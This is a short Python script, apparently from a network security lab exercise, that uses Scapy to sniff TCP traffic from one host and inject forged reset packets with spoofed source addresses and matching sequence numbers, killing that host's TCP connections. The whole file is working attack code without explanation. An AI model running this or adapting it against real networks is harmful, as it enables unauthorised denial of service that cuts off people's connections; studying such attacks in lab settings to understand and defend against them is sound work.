#!/usr/bin/python3
from scapy.all import *

def spoof_tcp(pkt):
    ip = IP(dst="10.0.2.15", src=pkt[IP].dst)
    tcp = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    spoofpkt = ip/tcp
    send(spoofpkt, verbose=0)

pkt=sniff(filter='tcp and src host 10.0.2.15', prn=spoof_tcp)
